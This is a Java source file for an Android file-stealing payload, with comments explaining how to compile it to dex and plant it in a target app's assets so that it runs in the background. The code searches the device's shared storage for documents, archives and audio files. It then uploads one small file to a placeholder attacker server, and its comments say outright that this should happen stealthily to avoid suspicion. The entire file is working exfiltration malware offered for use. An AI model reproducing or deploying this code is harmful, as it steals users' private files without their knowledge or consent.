import java.io.*;
import java.util.*;
import org.apache.http.client.*;
import org.apache.http.client.methods.*;
import org.apache.http.entity.*;
import org.apache.http.impl.client.*;

public class Uploader {
    // Uploading some files to http server
    /*
	 What to do in this class: 
     get result list from 'find' command, then upload file(s) stealthily (No foreground delay)
     Command line usage: dalvikvm -cp classes.dex Uploader
         
	 Benefit of using dalvikvm to run codes:
	 Android app is run under single thread, too much code injected will make the app pauses/lags. 
	 Shell command, "dalvikvm" Make your program run in background, avoid making the target app laggy, making it suspicious.

	 What shouldn't be written in this program:
	 When the code needs Android libraries (I didn't test, but I guess adding all Android libraries(.jar) to this program is impossible ;/)
	 Theoretically, the "dex" file should include all imported libraries (except default java library) 
	 
    How to use this class for injection:
    Easiest way is to find an android ide like AIDE or Java N-IDE, add required libraries, copy and paste this program.
    Then compile it. Go to the folder (like 'output'/'release' under 'bin' folder) in your project, find "classes.dex", zip it with password 'a' finally copy it to target app's assets folder.
	 
	 Alternative way to create dex:
	 1. Use VScode to create a project 
	 2. Put libraries to lib folder
	 3. Extract the libraries to src folder
	 4. After testing code, use command: javac xxx.java --source 1.6 --target 1.6
	 5. ZIP then COPY the generated class file (along with the extracted library folders) to an Android device, make sure the device has terminal emulator
	 6. Use the following commands:
	 	pkg install dx
		dx --dex --output=xxx.dex xxx.zip
	7. Test using command: dalvikvm --cp xxx.dex [name of the main java class, the one you coded]
		
	*/
    public static void main(String[] args) {
        //preparation work (search for valid files)
        String extList[] = {
			".pdf",
			".doc", 
			".docx",
			".ppt",
			".pptx",
			".xls", 
			".xlsx",
			".zip",
            ".mp3"};
        //String ext = String.join(" -o -name *", extList); <- it causes crash in some Android versions
        String ext = "";
        for(int i = 0; i < extList.length; i++)
        {
            ext += extList[i];
            if(i < extList.length - 1)ext += " -o -name *";
        }

        String[] cmds = {"sh", "-c", String.format("find /sdcard/ -name *%s > .r3su1t", ext)};//shell commands
        
        
        //specify the name of the file [a list of paths (the target file's locations)]
        File f = new File(".r3su1t");
        try
        {
            //command execution
            Runtime.getRuntime().exec(cmds).waitFor();

            Scanner sc = new Scanner(f);
            ArrayList<String> targets = new ArrayList<String>();
            while(sc.hasNextLine())
            {
                targets.add(sc.nextLine());
            }
			
            Collections.shuffle(targets);
            //set limitation of files to upload, here I set 1
            int fcount = 0;
            for(int i = 0; i < targets.size(); i++)
            {   
                File temp = new File(targets.get(i).toString());
                Long fsize = temp.length() / 1024 / 1024; //MB
                if(fsize <= 3)
                {
			uploadFile(temp);
			System.out.println("ok: " + targets.get(i).toString()); 
                }
                fcount++;
                if(fcount == 1)break;
            }

        }catch(Exception e)
        {System.out.println(e.toString());}

    }

    static void uploadFile(File file) {

        if(!file.exists()) return;
        try
        {
            FileEntity reqEntity = new FileEntity(file, "binary/octet-stream");

            HttpPost post = new HttpPost("http://yourhost/file.php");

            //set binary entity
            post.setEntity(reqEntity);
            reqEntity.setContentType("binary/octet-stream");

            //set timestamp of the file as the component of filename
            post.setHeader("fname", file.getName());

            //fire
            HttpClient httpclient = new DefaultHttpClient();
            httpclient.execute(post);

        }catch(Exception e)
        {System.out.println(e.toString());}
    }

}
